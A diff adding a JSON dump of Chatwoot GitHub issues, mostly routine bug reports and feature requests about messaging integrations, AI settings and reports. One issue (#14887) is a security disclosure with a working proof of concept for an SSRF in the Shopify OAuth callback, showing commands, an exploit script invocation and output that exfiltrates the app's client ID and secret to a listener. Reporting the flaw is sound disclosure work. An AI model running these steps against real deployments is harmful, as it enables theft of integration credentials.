+        "id": 4813856033,
+        "number": 14932,
+        "title": "Instagram inboxes stopped receiving/sending messages on Chatwoot Cloud",
+        "state": "open",
+        "created_at": "2026-07-05T17:53:28Z",
+        "updated_at": "2026-07-14T00:13:52Z",
+        "closed_at": null,
+        "author": "martz14",
+        "comments": 4,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nSince yesterday,  Instagram inboxes on Chatwoot Cloud stopped working in several Chatwoot accounts.\n\nSymptoms:\n- Incoming Instagram messages are not received in Chatwoot\n- Sending messages from Chatwoot fails\n- Error shown in Chatwoot UI when sending message: 100 - Unsupported request - method type: post\nImportant details:\n- This affects multiple client accounts\n- Another Chatwoot Cloud user confirmed the same issue\n- The issue started suddenly yesterday\n- No changes were made on our side before the issue started\n\nThe issue persists across all accounts.\n\nCould this be related to a recent Meta API change or a regression in Chatwoot Cloud Instagram integration? What should I do?\n\n### To Reproduce\n\nInstagram messages should be received normally in Chatwoot, and agents should be able to send replies successfully through the Instagram inbox integration without API errors.\n\n### Expected behavior\n\n_No response_\n\n### Environment\n\napp.chatwoot.com\n\n### Cloud Provider\n\n_No response_\n\n### Platform\n\nBrowser\n\n### Operating system\n\n_No response_\n\n### Browser and version\n\n_No response_\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\n_No response_",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14932"
+    },
+    {
+        "id": 4813431721,
+        "number": 14931,
+        "title": "BSUID whatsapp",
+        "state": "open",
+        "created_at": "2026-07-05T15:40:24Z",
+        "updated_at": "2026-07-05T16:00:21Z",
+        "closed_at": null,
+        "author": "slmartinez",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nI tested the scenario mentioned by @sony-mathew (mixed payload followed by BSUID-only payload) on a self-hosted instance with PR #14436 merged, using the **exact payload format documented by Meta** (i.e. `wa_id` is completely omitted when the phone number is unavailable — the BSUID only appears in `user_id`/`from_user_id`, not stuffed into `wa_id`). (v4.15.1)\n\n\n\nThen I sent a cURL request to simulate the new behavior where the phone number field will no longer be included. This causes the conversation to be duplicated.\n\n### To Reproduce\n\n**Step 1:** A contact messages normally (payload includes both `wa_id`/phone and `from_user_id`/BSUID). This creates `contact_id: 220` with `contact_inbox_id: 121` (source_id = phone number) and conversation `id: 169`.\n\n**Step 2:** I simulated a BSUID-only inbound message (no `from`/phone field, simulating a user who has enabled WhatsApp usernames and hidden their phone number):\n\n​```bash\ncurl -v -X POST https://your-chatwoot-instance.com/webhooks/whatsapp/<PHONE_NUMBER_ID> \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"object\": \"whatsapp_business_account\",\n    \"entry\": [{\n      \"id\": \"<WABA_ID>\",\n      \"changes\": [{\n        \"value\": {\n          \"messaging_product\": \"whatsapp\",\n          \"metadata\": {\n            \"display_phone_number\": \"573000000001\",\n            \"phone_number_id\": \"<PHONE_NUMBER_ID>\"\n          },\n          \"contacts\": [{\n            \"profile\": {\"name\": \"Test User\", \"username\": \"testuser123\"},\n            \"user_id\": \"CO.XXXXXXXXXXXXXXXX\"\n          }],\n          \"messages\": [{\n            \"from_user_id\": \"CO.XXXXXXXXXXXXXXXX\",\n            \"id\": \"wamid.TESTBSUIDONLY002\",\n            \"timestamp\": \"'\"$(date +%s)\"'\",\n            \"text\": {\"body\": \"message with BSUID only, no phone number\"},\n            \"type\": \"text\"\n          }]\n        },\n        \"field\": \"messages\"\n      }]\n    }]\n  }'\n​```\n\n**Result:** This created a *second* `contact_inbox` (id: 122, source_id = BSUID) for the **same** `contact_id: 220`, and a **new, separate conversation** (`id: 170`) instead of continuing the existing one (`id: 169`):\n\n<img width=\"763\" height=\"820\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/bd5d697f-b915-4395-a0f0-694dd6e16e0f\" />\n\nIn the Chatwoot UI, this shows up as two separate open conversations for the same contact:\n\n<img width=\"404\" height=\"264\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/6983edff-962c-406b-b6d8-fc8863cb5727\" />\n\nThis confirms the P1 finding @sony-mathew mentioned in the RSpec reproduction: mixed-then-BSUID-only inbound messages split the conversation thread instead of merging into the existing one.\n\n## Additional finding: outbound sending fails on the BSUID-only conversation\n\nWhen attempting to reply from the agent side on the conversation created via the BSUID-only `contact_inbox` (id: 122), the outgoing message fails with:\n\n​```\nexternal_error: \"131026: Message undeliverable\"\n​```\n\nThis suggests the outgoing send is using the `contact_inbox.source_id` (the BSUID) directly as the `to` recipient in the WhatsApp Cloud API call, which Meta's Send API does not yet support as a valid recipient format outside of the officially documented BSUID-sending flow (expected June 2026 per Meta's docs). This makes any conversation anchored to a BSUID-only `contact_inbox` effectively unable to receive agent replies.\n\n### Expected behavior\n\nWhen a WhatsApp user sends a message using only their BSUID (no phone number present in the payload, e.g. after enabling WhatsApp usernames and hiding their phone number), Chatwoot should recognize that the BSUID belongs to an existing contact (matched via a prior mixed payload containing both phone and BSUID) and continue the existing conversation thread.\n\nInstead, Chatwoot creates a new, separate `ContactInbox` and a new `Conversation` for the same contact, splitting the conversation history into two threads for what is the same underlying WhatsApp user.\n\n### Environment\n\nLinux VM\n\n### Cloud Provider\n\nDigitalOcean\n\n### Platform\n\nBrowser\n\n### Operating system\n\nlinux\n\n### Browser and version\n\nchrome\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\n_No response_",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14931"
+    },
+    {
+        "id": 4801351070,
+        "number": 14925,
+        "title": "Translate action silently does nothing when Google Translate integration is not configured",
+        "state": "open",
+        "created_at": "2026-07-03T07:29:21Z",
+        "updated_at": "2026-07-10T18:11:22Z",
+        "closed_at": null,
+        "author": "moonexplore",
+        "comments": 1,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "## Describe the bug\n\nThe message context menu shows the `Translate` action even when the Google Translate integration is not configured for the account.\n\nClicking `Translate` sends a request to the backend, but nothing visible happens in the UI. No translated content is shown, and no warning or error explains that Google Translate has not been configured.\n\nThis makes the feature appear broken to agents instead of clearly indicating that setup is required.\n\n## To Reproduce\n\n1. Use a Chatwoot account where `Settings -> Applications -> Google Translate` has not been configured.\n2. Open any conversation with a text message.\n3. Open the message context menu.\n4. Click `Translate`.\n5. Observe that the menu closes, but no translation appears and no feedback is shown.\n\n## Expected behavior\n\nChatwoot should either:\n\n- Hide or disable the `Translate` action when Google Translate is not configured, or\n- Show a clear message such as: `Google Translate is not configured. Please configure it in Settings -> Applications.`\n\nThe API should also return a meaningful error response when the integration hook is missing, instead of returning an empty translation result.\n\n## Environment\n\nDocker\n\n## Cloud Provider\n\nOther [please specify in the description]\n\n## Platform\n\nBrowser\n\n## Operating system\n\n_No response_\n\n## Browser and version\n\n_No response_\n\n## Docker (if applicable)\n\nSelf-hosted Docker installation.\n\n## Additional context\n\nIn my local self-hosted instance, there is no `google_translate` integration hook for the account:\n\n```ruby\nIntegrations::Hook.where(app_id: \"google_translate\")\n# => []\n```\n\nWhen clicking `Translate`, the frontend still calls:\n\n```text\nPOST /api/v1/accounts/:account_id/conversations/:conversation_id/messages/:message_id/translate\n```\n\nThe backend reaches `Integrations::GoogleTranslate::ProcessorService#perform`, but returns early when no Google Translate hook exists. The frontend action currently catches and ignores errors, so the user receives no feedback.\n\nRelevant behavior:\n\n- The action is visible and clickable.\n- The request completes without useful user-facing feedback.\n- No translation is stored in `content_attributes.translations`.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14925"
+    },
+    {
+        "id": 4787204518,
+        "number": 14911,
+        "title": "Support descriptions for WhatsApp input_select list rows",
+        "state": "open",
+        "created_at": "2026-07-01T16:02:52Z",
+        "updated_at": "2026-07-06T14:28:10Z",
+        "closed_at": null,
+        "author": "izcoser",
+        "comments": 3,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "### Is your feature or enhancement related to a problem? Please describe.\n\nWhatsApp interactive list rows support an optional description/subtitle for each row. Chatwoot currently exposes `input_select` items with `title` and `value`, but rejects an item-level `description` key during message validation.\n\nThis prevents integrations from rendering compact WhatsApp list titles with longer explanatory subtitles. For example, an education/tenant bot may need list rows like:\n\n- title: `Option 1`\n- description: `Nursing - Distance Learning | 2026/1`\n\nWithout description support, the integration must either truncate meaningful labels to WhatsApp row title limits or move all details into the message body, which is a worse UX for longer menus.\n\nCurrent behavior when sending `content_type: input_select` with item descriptions:\n\n```json\n{\n  \"content_type\": \"input_select\",\n  \"content_attributes\": {\n    \"items\": [\n      {\n        \"title\": \"Option 1\",\n        \"value\": \"option_1\",\n        \"description\": \"Nursing - Distance Learning | 2026/1\"\n      }\n    ]\n  }\n}\n```\n\nChatwoot rejects it because `description` is not in the allowed select item keys.\n\n### Describe the solution you would like\n\nAllow `description` as an optional key for `input_select` items and forward it when building WhatsApp list rows.\n\nA rough implementation would be:\n\n1. Add `description` to `ContentAttributeValidator::ALLOWED_SELECT_ITEM_KEYS`.\n2. Update `Whatsapp::Providers::BaseService#create_rows` to include `description` when present:\n\n```ruby\nrow = { \"id\" => item[\"value\"], \"title\" => item[\"title\"] }\ndescription = item[\"description\"] || item[:description]\nrow[\"description\"] = description if description.present?\n```\n\n3. Add/update WhatsApp provider specs to assert list rows can include `description`.\n\nThis should be backward compatible because the field is optional, and existing `input_select` payloads continue to work unchanged.\n\n### Describe alternatives you have considered\n\nThe main workaround is to put all row details in the message body and keep list row titles short, but this makes the interactive list less useful and less readable.\n\nAnother alternative is for external middleware to bypass Chatwoot and call WhatsApp directly, but that loses the benefit of using Chatwoot as the source of truth for channel delivery.\n\n### Additional context\n\nThis applies specifically to WhatsApp list messages. WhatsApp reply buttons do not support row descriptions, so this enhancement is most useful when Chatwoot renders `input_select` as a list message.\n\nWhatsapp screenshot of the output we want Chatwoot to do, which it currently can't:\n\n<img width=\"749\" height=\"622\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/bdd4568c-ad76-4844-b1f7-15e40563e321\" />\n",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14911"
+    },
+    {
+        "id": 4781568841,
+        "number": 14903,
+        "title": "feat: Extend configurable model/endpoint (added in #12563 / #13141) to reply composer AI actions, not just Captain",
+        "state": "open",
+        "created_at": "2026-07-01T01:20:49Z",
+        "updated_at": "2026-07-01T01:20:49Z",
+        "closed_at": null,
+        "author": "hectorroaz",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "### Is your feature or enhancement related to a problem? Please describe.\n\n#12563 (fixed via #13141) added a configurable API base URL and model for Captain under Settings → Captain, so self-hosted installs can point to OpenAI-compatible providers (Groq, Together AI, DeepSeek, etc). However, that configurability only reaches Captain-specific features (RAG conversations, FAQ generation, article translation, widget tagline).\n\nThe reply composer's AI writing-assist actions — **Improve Reply, Fix Spelling & Grammar, Change Tone, Reply Suggestion, Summarize, Label Suggestion** — are implemented in `lib/captain/rewrite_service.rb`, `reply_suggestion_service.rb`, `summary_service.rb`, `label_suggestion_service.rb`, and `follow_up_service.rb`, all inheriting from `Captain::BaseTaskService`. These hardcode:\n\n```ruby\nGPT_MODEL = Llm::Config::DEFAULT_MODEL # 'gpt-4.1-mini' — lib/llm/config.rb\n```\n\nand never read the `CAPTAIN_OPEN_AI_MODEL` InstallationConfig that the Captain settings UI already writes. So even after pointing `CAPTAIN_OPEN_AI_ENDPOINT` at an OpenAI-compatible provider, the reply composer keeps requesting `gpt-4.1-mini` — which doesn't exist on providers like Groq — while there's no UI path to change it short of patching source.\n\n### Describe the solution you'd like\n\nMake `Captain::BaseTaskService::GPT_MODEL` resolve as `InstallationConfig.find_by(name: 'CAPTAIN_OPEN_AI_MODEL')&.value.presence || Llm::Config::DEFAULT_MODEL` — the same fallback already used in `enterprise/app/services/captain/llm/article_translation_service.rb` and `conversation_completion_service.rb`. This makes the model/endpoint configured once in Settings → Captain apply consistently across every AI feature Chatwoot ships, not only the agent/RAG side.\n\n### Describe alternatives you've considered\n\n- Editing `lib/llm/config.rb` directly — not viable on cloud or on self-hosted installs that auto-update the image (e.g. via Watchtower); the patch is lost on every update.\n- Configuring the account-level OpenAI integration hook — only overrides the credential, not the model or endpoint used by these task services.\n\n### Additional context\n\nThis would let teams use cheaper OpenAI-compatible providers (Groq, DeepSeek, Together AI) specifically for the reply composer actions without needing the paid Captain add-on — many self-hosted users rely on Improve Reply/Reply Suggestion far more than on Captain agents.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14903"
+    },
+    {
+        "id": 4772918691,
+        "number": 14895,
+        "title": "DISABLE_TELEMETRY=true but remote calls still made",
+        "state": "closed",
+        "created_at": "2026-06-30T01:39:33Z",
+        "updated_at": "2026-07-02T22:39:08Z",
+        "closed_at": "2026-07-02T22:34:45Z",
+        "author": "iammattmartin",
+        "comments": 3,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nSoftware appears to be doing some kind of remote call, even when telemetry is disabled.\n\nFor security reasons, we limit outbound quite strictly and there shouldn't be any reason the software is making calls.\n\n```\n       private\n\n\n\n       def update_version_info\n\n--->     return if @instance_info['version'].blank?\n\n\n\n         ::Redis::Alfred.set(::Redis::Alfred::LATEST_CHATWOOT_VERSION, @instance_info['version'])\n\n       end\n\n```\n\n### To Reproduce\n\nBlock output ports not required.\nSet DISABLE_TELEMETRY=true.\nWatch logs for this error (via Sentry)\n\n### Expected behavior\n\n_No response_\n\n### Environment\n\nSelf-hosted\n\n### Cloud Provider\n\nNone\n\n### Platform\n\nNone\n\n### Operating system\n\n_No response_\n\n### Browser and version\n\n_No response_\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\n_No response_",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14895"
+    },
+    {
+        "id": 4769604570,
+        "number": 14888,
+        "title": "Add visitor page tracking for website inbox conversations",
+        "state": "open",
+        "created_at": "2026-06-29T15:51:21Z",
+        "updated_at": "2026-06-30T01:43:09Z",
+        "closed_at": null,
+        "author": "amirgh2249",
+        "comments": 1,
+        "labels": [
+            "feature-request"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Is your feature or enhancement related to a problem? Please describe.\n\nWhen a visitor starts a conversation from the website live chat widget, agents do not have enough context about where the visitor currently is on the website or which pages they visited before starting the chat.\n\nThis makes support slower because agents often need to ask questions like “Which page are you on?” or “What were you trying to do?” even though this information could be available automatically.\n\nThis is especially useful for websites with multiple product pages, pricing pages, checkout pages, documentation pages, or support articles.\n\n\n### Describe the solution you'd like\n\nI would like Chatwoot website inboxes to show the visitor’s current page and page visit history to agents.\n\nIdeally, agents should be able to see this information inside the conversation sidebar, contact details, or conversation context panel.\n\nThe feature could include:\n\nCurrent page URL\nCurrent page title\nPrevious pages visited in the same session\nVisit timestamp for each page\nA clear indicator for the visitor’s currently active page\n\nFor example, if a visitor viewed the pricing page, then opened the checkout page and started a chat, the agent should be able to see that the visitor is currently on the checkout page and previously visited the pricing page.\n\n### Describe alternatives you've considered\n\nOne alternative is to use external analytics tools such as Google Analytics, Plausible, or custom tracking events. However, these tools are separate from Chatwoot and are not easily available to the support agent while replying to the conversation.\n\nAnother alternative is to manually ask the visitor which page they are on, but this adds friction and makes the support experience slower.\n\n### Additional context\n\nMany modern live chat platforms provide visitor activity or page tracking so agents can understand the user’s context before replying.\n\nAdding this feature to Chatwoot website inboxes would help agents provide faster, more accurate support and reduce unnecessary back-and-forth with visitors.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14888"
+    },
+    {
+        "id": 4768553310,
+        "number": 14887,
+        "title": "[Security] Chatwoot Shopify OAuth SSRF + Credential Exfiltration",
+        "state": "open",
+        "created_at": "2026-06-29T13:27:47Z",
+        "updated_at": "2026-06-29T13:27:47Z",
+        "closed_at": null,
+        "author": "geo-chen",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nhttps://github.com/chatwoot/chatwoot/security/advisories/GHSA-wxhm-4rjw-9m7v\n\nOpened on 11 May with no responses.\n\n\n### Summary\nThe Shopify OAuth callback endpoint constructs an `OAuth2::Client` using `params[:shop]` as the `site:` hostname without any validation. On code exchange, the OAuth2 gem POSTs to `https://{params[:shop]}/admin/oauth/access_token` with `client_id` and `client_secret` in both the request body and an `Authorization: Basic header`.\nAny authenticated user (agent-level) can obtain a non-expiring state JWT and replay it with an arbitrary `shop=` value, redirecting the outbound POST to an attacker-controlled host and exfiltrating the Shopify app credentials.\n\n### Details\nVulnerable code: \n```\n# callbacks_controller.rb:48 — unvalidated user input\nsite: \"https://#{params[:shop]}\"\n\n# integration_helper.rb:17-21 — no exp, no shop binding\ndef token_payload(account_id)\n  { sub: account_id, iat: Time.current.to_i }\nend\n```\n\n\n\n### To Reproduce\n\n### PoC\n\n#### Environment\n\n| Item | Value |\n|------|-------|\n| Chatwoot image | `chatwoot/chatwoot:latest` (v3.x) |\n| DB | `pgvector/pgvector:pg16` |\n| Listener IP | `172.18.0.1` (Docker bridge host) |\n| Listener port | `9443` (HTTPS) |\n| Fake credentials | `SHOPIFY_CLIENT_ID=test_client_12345`, `SHOPIFY_CLIENT_SECRET=test_secret_99999` |\n\n#### Setup\n\n```bash\n# 1. Start Chatwoot in Docker\ncd vuln-pipeline/targets/chatwoot/docker-test\ndocker compose up -d\n\n# 2. Create account and obtain API token (sign-up route disabled in prod image)\ndocker compose exec rails bundle exec rails runner \"\n  u = User.create!(name:'attacker', email:'attacker@evil.com',\n        password:'P@ssw0rd1!', password_confirmation:'P@ssw0rd1!',\n        account_id: 1, role: :administrator)\n  Account.first.account_users.create!(user: u, role: :administrator)\n\"\nTOKEN=$(curl -s -X POST http://localhost:3000/auth/sign_in \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"attacker@evil.com\",\"password\":\"P@ssw0rd1!\"}' | \\\n  python3 -c \"import sys,json; print(json.load(sys.stdin)['data']['access_token'])\")\n\n# 3. Set fake Shopify credentials in the DB\ndocker compose exec rails bundle exec rails runner \"\n  ['SHOPIFY_CLIENT_ID','SHOPIFY_CLIENT_SECRET'].zip(\n    ['test_client_12345','test_secret_99999']\n  ).each { |name, val|\n    InstallationConfig.find_by(name: name)&.update!(value: val) ||\n    InstallationConfig.create!(name: name, value: val, locked: false)\n  }\n\"\n```\n\n\n#### Obtain State JWT\n\n```bash\nSTATE=$(curl -s -X POST http://localhost:3000/api/v1/accounts/2/integrations/shopify/auth \\\n  -H \"api_access_token: $TOKEN\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"shop_domain\":\"legitimate-shop.myshopify.com\"}' | \\\n  python3 -c \"\nimport sys, json, urllib.parse as u\nredir = json.load(sys.stdin)['redirect_url']\nprint(u.parse_qs(u.urlparse(redir).query)['state'][0])\n\")\necho \"State JWT: $STATE\"\n```\n\n#### Inject TLS Certificate into Container\n\nThe OAuth2 gem verifies TLS. A self-signed cert for the listener IP must be trusted by the container:\n\n```bash\n# Generate cert with SAN=IP:172.18.0.1\nopenssl req -x509 -newkey rsa:2048 -nodes -days 1 \\\n  -keyout /tmp/poc.key -out /tmp/poc.crt \\\n  -subj \"/CN=172.18.0.1\" \\\n  -addext \"subjectAltName=IP:172.18.0.1\"\n\n# Append to container CA bundle\ncat /tmp/poc.crt | docker compose exec -T rails sh -c \\\n  'cat >> /etc/ssl/certs/ca-certificates.crt'\n```\n\nI have a PoC script that handles cert generation and injection automatically. Let me know if you need that. \n\n#### Fire the Exploit\n\n```bash\npython3 scripts/chatwoot-F01-validate.py \\\n  --base-url http://localhost:3000 \\\n  --token \"$TOKEN\" \\\n  --account-id 2 \\\n  --listen-ip 172.18.0.1 \\\n  --listen-port 9443 \\\n  --container chatwoot-docker-test-rails-1\n```\n\n#### Observed Output\n\n```\n============================================================\nChatwoot F01 — SSRF + Shopify Credential Exfiltration PoC\n============================================================\n\n[*] Requesting state JWT from http://localhost:3000/api/v1/accounts/2/integrations/shopify/auth\n[+] State JWT obtained: eyJhbGciOiJIUzI1NiJ9.eyJzdWI...\n\n[+] Self-signed cert written to /tmp/tmp.../chatwoot_poc.crt\n[+] CA cert injected into container 'chatwoot-docker-test-rails-1'\n\n[*] HTTPS listener started on 172.18.0.1:9443\n[*] Firing callback: GET http://localhost:3000/shopify/callback\n    shop=172.18.0.1:9443  code=weaponized\n\n[+] VULNERABILITY CONFIRMED — Chatwoot POSTed credentials to attacker listener\n\n    Path:          /admin/oauth/access_token\n    Authorization: Basic dGVzdF9jbGllbnRfMTIzNDU6dGVzdF9zZWNyZXRfOTk5OTk=\n    Decoded creds: test_client_12345:test_secret_99999\n\n    SHOPIFY_CLIENT_ID     = test_client_12345\n    SHOPIFY_CLIENT_SECRET = test_secret_99999\n\n    POST body: code=weaponized&grant_type=authorization_code&redirect_uri=%2Fshopify%2Fcallback\n```\n\nThe `Authorization: Basic` header is how the OAuth2 gem authenticates the token exchange - it base64-encodes `client_id:client_secret` and sends it as a header, exfiltrating both values in a single request.\n\n\n### Impact\n- **Credential theft**:  `SHOPIFY_CLIENT_SECRET` exfiltrated to attacker\n- **SSRF**: server POSTs to arbitrary HTTPS URL (RFC-1918 reachable)\n- **Token forgery**: stolen secret enables forging JWTs for any account\n- **No expiry**: captured tokens are permanently reusable\n\n\n### Expected behavior\n\n_No response_\n\n### Environment\n\nDocker\n\n### Cloud Provider\n\nNone\n\n### Platform\n\nNone\n\n### Operating system\n\n_No response_\n\n### Browser and version\n\n_No response_\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\n_No response_",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14887"
+    },
+    {
+        "id": 4759139804,
+        "number": 14872,
+        "title": "CSAT report shows \"No assigned agent\" for conversations that were handled by agents",
+        "state": "open",
+        "created_at": "2026-06-27T16:43:24Z",
+        "updated_at": "2026-06-27T16:43:24Z",
+        "closed_at": null,
+        "author": "ThisIRFANBUTT",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nOn the CSAT page, the Handled by column displays \"No assigned agent\" for every CSAT response.\n\nThis is incorrect because these conversations were actually handled by our support agents, and the customers submitted their CSAT ratings after interacting with those agents.\n\nThe conversations themselves have assigned agents, but the CSAT report does not display them.\n\n<img width=\"1301\" height=\"861\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4d571a4e-172c-41bc-84d9-6a5f89fd2192\" />\n\n### To Reproduce\n\nAutomation 1:\nUnassign conversations when they are marked as Resolved.\nI do not believe this automation is related to the issue, as it has been in use without affecting CSAT previously.\n\nAutomation 2:\nWe have two departments:\n1. Sales\n2. Technical\n\nCustomers choose the department from a pre-chat form using a custom attribute.\nAn automation then checks the selected custom attribute and automatically assigns the conversation to the corresponding team:\n\n- If the customer selects Sales, the conversation is assigned to the Sales team.\n- If the customer selects Technical, the conversation is assigned to the Technical team.\n\nAfter implementing this second automation, the CSAT → Handled by column stopped displaying the assigned agent and instead shows \"No assigned agent\" for every CSAT response, even though the conversations were handled by agents and customers successfully submitted their ratings.\n\nThis issue did not occur before adding the department assignment automation.\n\n### Expected behavior\n\nThe Handled by column should display the name of the agent who handled the conversation (or the last assigned agent responsible for the conversation).\n\n### Environment\n\napp.chatwoot.com\n\n### Cloud Provider\n\nNone\n\n### Platform\n\nNone\n\n### Operating system\n\n_No response_\n\n### Browser and version\n\n_No response_\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\n_No response_",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14872"
+    }
+]
